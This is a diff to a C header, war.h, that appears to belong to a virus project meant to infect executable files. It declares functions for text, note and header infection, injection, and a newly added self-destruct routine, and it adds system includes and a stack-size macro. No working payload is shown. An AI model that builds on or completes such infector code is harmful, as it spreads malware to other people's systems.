@@ -1,5 +1,6 @@
 #ifndef WAR_H
 #define WAR_H
+#define _GNU_SOURCE
 
 ////////////////////////////////////////////////////////////////////////////////
 /// INCLUDES 
@@ -15,6 +16,10 @@
 #include <unistd.h>
 #include <stdbool.h>
 #include <string.h>
+#include <sched.h>
+#include <time.h>
+#include <sys/wait.h>
+#include <sys/random.h>
 
 ////////////////////////////////////////////////////////////////////////////////
 /// MACROS 
@@ -32,6 +37,8 @@
 
 #define JMP_OFFSET 66
 #define JMP_OPCODE 0xe9
+
+#define STACK_SIZE 1024 * 64
 
 ////////////////////////////////////////////////////////////////////////////////
 /// ENUMS
@@ -95,6 +102,7 @@ void text_infection(struct s_host *host, struct s_keychain *keychain, enum e_con
 void note_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void header_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void injection(struct s_host *host, struct s_keychain *keychain, enum e_context context);
+void autodestruction(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 
 void __exit(void *stack);
 
